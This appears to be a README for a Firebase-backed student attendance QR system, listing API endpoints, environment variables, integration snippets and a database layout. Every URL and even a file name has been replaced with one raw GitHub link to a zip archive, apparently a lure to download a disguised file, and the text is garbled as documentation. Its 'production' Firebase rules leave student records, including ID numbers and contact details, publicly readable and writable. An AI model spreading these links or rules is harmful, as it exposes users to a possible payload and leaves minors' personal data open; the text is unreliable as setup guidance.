# ThisApp Backend - Firebase Version

Backend server for the Student Attendance QR System using **Firebase Realtime Database**.

## 🔥 Features

- **Firebase Realtime Database** for persistent cloud storage
- **No data loss** on server restart
- **Real-time sync** capabilities
- **Free tier** with generous limits

## 🌐 Deployment

**Production URL**: `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip`

Deployed on [https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip](https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip) with auto-deploy from GitHub.

## 📡 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/health` | GET | Health check |
| `/api/scan` | POST | Process QR code scan |
| `/api/users` | POST | Register/update user |
| `/api/users/:email` | GET | Get user by email |
| `/api/all-users` | GET | Get all users |
| `/api/history/:email` | GET | Get scan history |
| `/api/attendance/:email` | GET | Get attendance records |
| `/api/all-attendance` | GET | Get all attendance |
| `/api/sync` | POST | Bulk sync data |

## 🔧 Environment Variables

Set these in Render dashboard:

| Key | Value |
|-----|-------|
| `PORT` | `8080` |
| `FIREBASE_DATABASE_URL` | `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip` |

## 🏠 Local Development

1. Install dependencies:
   ```bash
   npm install
   ```

2. Create `.env` file:
   ```
   PORT=8080
   https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip
   ```

3. Start server:
   ```bash
   npm start
   ```

4. Test health endpoint:
   ```
   http://localhost:8080/api/health
   ```

## 📱 ESP32 Integration

Update your ESP32 code to use:
```cpp
const char* SERVER_URL = "https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip";
```

## 📲 Flutter App Integration

Update `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip`:
```dart
static const String baseUrl = 'https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip';
```

## 🔐 Firebase Security

Current rules are open for testing. For production, update Firebase rules:
```json
{
  "rules": {
    "users": {
      ".read": true,
      ".write": true
    },
    "attendance": {
      ".read": true,
      ".write": true
    },
    "scan_history": {
      ".read": true,
      ".write": true
    }
  }
}
```

## 📊 Database Structure (Firebase)

```
/users/{email_key}
  - email
  - name
  - grade_section
  - lrn
  - adviser
  - contact_number
  - schedule
  - qr_code_in
  - qr_code_out
  - created_at

/attendance/{email_date_type}
  - user_email
  - date
  - scan_time
  - status
  - qr_type
  - created_at

/scan_history/{auto_id}
  - user_email
  - qr_code
  - qr_type
  - scan_time
  - status
  - message
  - created_at
```

---

*Last updated: February 2026*
